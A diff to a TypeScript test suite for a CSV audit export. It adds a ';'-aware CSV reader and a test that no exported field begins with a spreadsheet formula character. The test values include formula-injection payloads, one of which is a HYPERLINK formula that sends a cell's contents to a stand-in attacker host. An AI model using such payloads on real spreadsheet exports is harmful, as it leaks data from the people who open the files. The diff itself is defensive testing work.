@@ -58,25 +58,38 @@ async function run(args: string[], fetch: (url: string) => Promise<Response>) {
   return { code, io };
 }
 
-/** An RFC 4180 reader: the records of a text, each record a list of cells. */
-function readCsv(text: string): string[][] {
+/** The first characters of a formula in a spreadsheet (the OWASP CSV injection rule). */
+const LEAD = /^[=+\-@\t\r]/;
+
+/**
+ * An RFC 4180 reader: the records of a text, each record a list of cells. A quote opens a quoted
+ * cell only at the start of a cell; in the middle of a cell it is text. The `,` reader is the
+ * reader of the contract. The `;` reader is a spreadsheet with `;` as its list separator: it ends
+ * a record at a line feed or a carriage return outside quotes, as LibreOffice does.
+ */
+function readCsv(text: string, sep: "," | ";" = ","): string[][] {
   const records: string[][] = [];
   let cells: string[] = [];
   let cell = "";
   let quoted = false;
+  let start = true;
   for (let i = 0; i < text.length; i++) {
     const c = text[i];
+    const wasStart = start;
+    start = false;
     if (quoted) {
       if (c === '"' && text[i + 1] === '"') {
         cell += '"';
         i++;
       } else if (c === '"') quoted = false;
       else cell += c;
-    } else if (c === '"') quoted = true;
-    else if (c === ",") {
+    } else if (c === '"' && wasStart) quoted = true;
+    else if (c === sep) {
       cells.push(cell);
       cell = "";
-    } else if (c === "\n") {
+      start = true;
+    } else if (c === "\n" || (sep === ";" && c === "\r")) {
+      start = true;
       cells.push(cell);
       records.push(cells);
       cells = [];
@@ -168,21 +181,50 @@ describe("authtempo audit export (plan 13b Task 8)", () => {
     }
   });
 
-  // Plan 13b, ruling R23: a spreadsheet with `;` as its list separator (de-DE, fr-FR) splits an
-  // unquoted line at `;`. The cell after the `;` would then start with `=` and run as a formula.
-  it("injection: a cell that holds a ; gets quotes, so a ; list separator does not split it", async () => {
-    for (const agent of ["x;=HYPERLINK(A2)", 'x;=HYPERLINK("https://evil.example/?"&A2,"open")']) {
-      const s = stub([row("a1", { userAgent: agent })], []);
+  // Plan 13b, rulings R23 and R29: a spreadsheet with `;` as its list separator (de-DE, fr-FR)
+  // splits the line at each `;` and does not see the quotes of a `,` cell. So the guard must hold
+  // for a `;` reader and for a `,` reader. The values are attacker text in three columns that core
+  // fills from the request: the reason, the `data` JSON, and the user agent.
+  it("injection: no field starts with a formula lead for a ; reader or a , reader", async () => {
+    const values = [
+      "x;=1+1;y",
+      'x;=HYPERLINK("https://evil.example/?"&A2,"open");',
+      'x;"=1+1;',
+      "x\n=1+1;",
+      "x\r=1+1;",
+      "x;+1;",
+      "x;-1;",
+      "x;@SUM(A1);",
+      "x;\t=1;",
+      "x;\r=1;",
+      "=1;=2",
+      "\r=1",
+      ";=1",
+      "x;",
+      "x\n",
+    ];
+    for (const value of values) {
+      const s = stub([row("a1", { reason: value, data: { note: value }, userAgent: value })], []);
       const { code, io } = await run(["--organization", ORG, "--format", "csv"], s.fetch);
       expect(code, io.stderr.join("\n")).toBe(0);
-      // The user agent is the last column, so the line ends with the quoted cell.
-      expect(io.stdout[1]?.endsWith(`,"${agent.replaceAll('"', '""')}"`), agent).toBe(true);
-      expect(readCsv(io.stdout.join("\n"))[1]?.[10]).toBe(agent);
+      const text = io.stdout.join("\n");
+      const label = JSON.stringify(value);
+      // The `,` reader gets the 11 cells of the contract back.
+      const comma = readCsv(text);
+      expect(comma, label).toHaveLength(2);
+      expect(comma[1], label).toHaveLength(11);
+      for (const field of comma.flat()) expect(field, label).not.toMatch(LEAD);
+      // The `;` reader: no field starts with a lead, and no field starts with a quote. A quote at
+      // the start of a field puts a reader in quote mode, and each reader then splits differently.
+      for (const field of readCsv(text, ";").flat()) {
+        expect(field, label).not.toMatch(LEAD);
+        expect(field.startsWith('"'), `${label}: ${JSON.stringify(field)}`).toBe(false);
+      }
     }
-    // The formula guard still runs first: a cell that starts with `=` and holds a `;`.
+    // The `,` reader shows the text with one `'` before each lead.
     const t = stub([row("a1", { userAgent: "=1;=2" })], []);
     const r = await run(["--organization", ORG, "--format", "csv"], t.fetch);
-    expect(r.io.stdout[1]?.endsWith(`,"'=1;=2"`)).toBe(true);
+    expect(readCsv(r.io.stdout.join("\n"))[1]?.[10]).toBe("'=1;'=2");
   });
 
   it("no format: a usage error with exit 2 and no request", async () => {
